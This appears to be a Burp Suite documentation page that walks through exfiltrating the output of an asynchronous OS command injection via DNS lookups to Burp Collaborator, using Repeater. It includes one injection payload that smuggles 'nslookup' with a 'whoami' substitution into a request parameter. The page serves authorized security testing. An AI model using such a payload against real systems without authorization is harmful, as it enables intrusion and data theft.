Once you have identified a request that is vulnerable to asynchronous OS command injection, you can attempt to exfiltrate the output from injected commands through the out-of-band channel between the website and Burp Collaborator.

## Before you start

Identify a request that is vulnerable to asynchronous OS command injection. For more information, see [Testing for asynchronous OS command injection vulnerabilities with Burp Suite.](https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/input-validation/command-injection/asynchronous)

## Steps

You can use Burp Repeater to attempt to exfiltrate data from a request:

1.
 In **Proxy > HTTP history**, right-click the request that is vulnerable to asynchronous OS command injection. Select **Send to Repeater**.

1.
 Go to the **Repeater** tab.

1.

Change a parameter's value to a proof-of-concept payload. The payload should include:

  -
 The `nslookup` command to cause DNS lookup for a Collaborator subdomain. To insert a Collaborator subdomain into the payload, right-click and select **Insert Collaborator payload**.

  -
 A command that obtains information, such as the `whoami` command.


For example, `& nslookup `whoami`.burp-collaborator-subdomain &` may cause a DNS lookup to the Burp Collaborator subdomain. This lookup will contain the result of the `whoami` command.
1.
 Click **Send**.

1.
 Go to the **Collaborator** tab and click **Poll now**. Any interactions with the Collaborator server are listed in the table.

1.
 Review the details of any interactions to identify any exfiltrated data.


#### Note

The command may be executed after a delay. The **Collaborator** tab flashes when an interaction occurs. Make sure that you continue to check the **Collaborator** tab to identify any delayed interactions.
